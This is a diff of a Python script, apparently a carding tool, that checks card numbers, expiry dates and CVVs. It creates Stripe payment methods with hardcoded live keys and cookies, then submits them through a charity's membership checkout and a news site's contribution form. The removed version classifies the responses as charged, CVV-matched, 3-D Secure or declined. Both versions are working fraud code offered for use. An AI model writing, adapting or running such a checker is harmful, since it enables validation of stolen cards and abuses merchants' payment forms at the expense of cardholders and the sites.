@@ -1,156 +1,78 @@
-from requests import Session as s
-from random import randint as ran
-from random import choices as cho
-from faker import Faker
-from flask import Flask
-app = Flask(__name__)
-faker = Faker()
-s().follow_redirects = True
-s().verify = False
+def Tele(ccx):
+	import requests
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
 
-def typ(cc):
-    cc = str(cc)
-    cc = cc[0]
-    if cc == "3":
-        card_type = "amex"
-    elif cc == "4":
-        card_type = "visa"
-    elif cc == "5":
-        card_type = "mastercard"
-    elif cc == "6":
-        card_type = "discover"
-    else:
-        card_type = "Unknown"
-    return card_type
-    
-@app.route("/card=<cc>")
-def check(cc):
-    try:
-        num, mon, yer, cvv = map(str.strip, cc.split("|"))
-        name = faker.first_name().upper()
-        email = name + ''.join(cho("qwertyuiopasdfghjklzxcvbnm123456789", k=10)) + "@gmail.com"
-        
-        url = "https://api.stripe.com/v1/payment_methods"
-        data = {
-'amount': '1',
-  'currency': 'USD',
-  'donationType': 'single',
-  'formId': '2932',
-  'gatewayId': 'stripe_payment_element',
-  'firstName': 'Slayer',
-  'lastName': 'Noob',
-  'email': 'slayxhk@gmail.com',
-  'donationBirthday': '',
-  'originUrl': 'https://divinemercyfoundationfrbz.org/donate-now/',
-  'isEmbed': 'true',
-  'embedId': 'give-form-shortcode-1',
-  'gatewayData[stripePaymentMethod]': 'card',
-  'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
-  'gatewayData[formId]': '2932',
-  'gatewayData[stripeKey]': 'pk_live_51O7SW7HBRqtFAAv51cwE2zbndWvQGvW89bj4TJpI4UW3ZX0gMSXwQ4rYRwVpeuqnLZgx1LITItM0aNU9dGWlYRWz00pOG9nWvX',
-  'gatewayData[stripeConnectedAccountId]': 'acct_1O7SW7HBRqtFAAv5'
-        }
-        headers = {
-            'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 17 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/ZZHBZS Safari/619.2",
-  'Accept': "application/json",
-  'Accept-Encoding': "gzip, deflate, br, zstd",
-  'sec-ch-ua-platform': "\"iOS\"",
-  'sec-ch-ua-mobile': "?1",
-  'origin': "https://divinemercyfoundationfrbz.org",
-  'sec-fetch-site': "same-origin",
-  'sec-fetch-mode': "cors",
-  'sec-fetch-dest': "empty",
-  'referer': "https://divinemercyfoundationfrbz.org/?givewp-route=donation-form-view&form-id=2932",
-  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-  'priority': "u=1, i",
-  'Cookie': "__stripe_mid=b41897d3-f78e-457c-82d3-a3886d1e9d0f4e478a; __stripe_sid=fb64e7c0-b9f6-4e53-904d-0fa779339c4bd553b8"
-        }
-        response = s().post(url, headers=headers, data=data).json()
-        id = response["id"]
-        
-        if not id:
-            return f"Card: {cc} - Error: Unable to create payment method."
-        
-        url = "https://divinemercyfoundationfrbz.org/membership-account/membership-checkout/"
-        data = {
-    'level': '3',
-    'checkjavascript': '1',
-    'other_discount_code': '',
-    'discount_code': '',
-    'username': '',
-    'bfirstname': name,
-    'blastname': name,
-    'bemail': email,
-    'password': 'Op@88888',
-    'password2': 'Op@88888',
-    'bconfirmemail_copy': '1',
-    'fullname': '',
-    'baddress1': '',
-    'baddress2': '',
-    'bcity': '',
-    'bstate': '',
-    'bphone': '',
-    'vat_number': '',
-    'bzipcode': '10080',
-    'bcountry': 'US',
-    'CardType': typ(num),
-    'submit-checkout': '1',
-    'javascriptok': '1',
-    'apbct_visible_fields': '{"0":{"visible_fields":"other_discount_code other_discount_code_button discount_code discount_code_button username bfirstname blastname bemail password password2 fullname baddress1 baddress2 bcity bstate bphone vat_number bzipcode bcountry","visible_fields_count":19,"invisible_fields":"level checkjavascript bconfirmemail_copy CardType submit-checkout javascriptok","invisible_fields_count":6}}',
-    'payment_method_id': id,
-    'AccountNumber': f'XXXXXXXXXXXX{num[12:]}',
-    'ExpirationMonth': '03',
-    'ExpirationYear': f'{yer if len(yer)==4 else str(20)+yer}',
-}
-        
-        headers = {
-    'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 17 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/ZZHBZS Safari/619.2",
-	  'Accept': "application/json",
-	  'Accept-Encoding': "gzip, deflate, br, zstd",
-	  'sec-ch-ua-platform': "\"iOS\"",
-	  'sec-ch-ua-mobile': "?1",
-	  'origin': "https://js.stripe.com",
-	  'sec-fetch-site': "same-site",
-	  'sec-fetch-mode': "cors",
-	  'sec-fetch-dest': "empty",
-	  'referer': "https://js.stripe.com/",
-	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-	  'priority': "u=1, i",
-}
+	headers = {
+			'authority': 'api.stripe.com',
+			'accept': 'application/json',
+			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+			'content-type': 'application/x-www-form-urlencoded',
+			'origin': 'https://js.stripe.com',
+			'referer': 'https://js.stripe.com/',
+			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-site',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+	}
 
-        params = {
-		    'level': '3',
-		    }
-    
-        response = s().post(url, headers=headers,params=params,data=data).text.lower()
-        with open("test.html","w") as f:
-            f.write(response) 
-        
-        if any(msg in response for msg in ["succeeded","payment-success","successfully","thank you for your support","insufficient funds","insufficient_funds","payment-successfully","your card does not support this type of purchase","thank you","membership confirmation","/wishlist-member/?reg=","thank you for your payment","thank you for membership","payment received","your order has been received","purchase successful","your card is not supported"]):
-               with open("charged.html","w") as f:
-                   f.write(response)
-               msg = "CHARGED"
-               
-        elif any(msg in response for msg in ["incorrect_cvc","invalid cvc","invalid_cvc","incorrect cvc","incorrect cvv","incorrect_cvv","invalid_cvv","invalid cvv",'"cvv_check":"pass"',"cvv_check: pass","security code is invalid","security code is incorrect","zip code is incorrect","zip code is invalid","card is declined by your bank","lost_card","stolen_card","transaction_not_allowed","pickup_card"]):
-               with open("CCN/CVV.html","w") as f:
-                   f.write(response)
-               msg = "CCN/CVV"
-               
-        elif any(msg in response for msg in ["authentication required","three_d_secure","3d secure","stripe_3ds2_fingerprint"]):
-               with open("3D LIVE.html","w") as f:
-                   f.write(response)
-               msg = "3D LIVE"
-               
-        elif any(msg in response for msg in ["declined","do_not_honor","generic_decline","decline by your bank","expired_card","your card has expired","incorrect_number","card number is incorrect","processing_error","service_not_allowed","lock_timeout","card was declined","fraudulent"]):
-               msg = "DECLINED"
-               
-        else:
-               msg = "DECLINED[UNKNOWN]"
-               
-        return {"Author":"Sahid","Status":msg,"Gateway":"Stripe Auth","Card":cc}
-    
-    except Exception as e:
-        return {"Author":"Sahid","Status":str(e)}
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51DMipVKeLHvIBrT6uZAz9LxYzOMOThN05PGot0yoYRIOZNp15FLoaEoWAMJpapXjk4KRouXSLi0rQFEVB6uT6UqC00j5WzCylK'
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0",port=8008)
+	pm = r1.json()['id']
+
+	cookies = {
+			'__stripe_mid': 'e5b01e8c-dacf-4f97-b04e-4aca065681857ee92e',
+			'__stripe_sid': 'a94de27d-e021-4b13-8690-30e4fa15c00c581cca',
+	}
+
+	headers = {
+			'authority': 'tasmanianinquirer.com.au',
+			'accept': '*/*',
+			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
+			'origin': 'https://tasmanianinquirer.com.au',
+			'referer': 'https://tasmanianinquirer.com.au/contribute/',
+			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-origin',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+			'x-requested-with': 'XMLHttpRequest',
+	}
+
+	params = {
+			't': '1728134582304',
+	}
+
+	data = {
+			'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f254f6607b&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=rein48287%40gmail.com&names_1%5Bfirst_name%5D=Rein&names_1%5Blast_name%5D=Rein&payment_method=stripe&checkbox%5B%5D=Check%20to%20receive%20a%20free%20email%20alert%20when%20we%20publish%20a%20new%20story&__entry_intermediate_hash=372032a6a1cf4f2f7168c0435348c0a3&__stripe_payment_method_id='+str(pm)+'',
+			'action': 'fluentform_submit',
+			'form_id': '3',
+	}
+	
+	response = requests.post(
+			'https://tasmanianinquirer.com.au/wp-admin/admin-ajax.php',
+			params=params,
+			cookies=cookies,
+			headers=headers,
+			data=data,
+	).json()
+	try:
+		ii=response['errors']
+	except:
+		return 'success'
+	return ii
+	
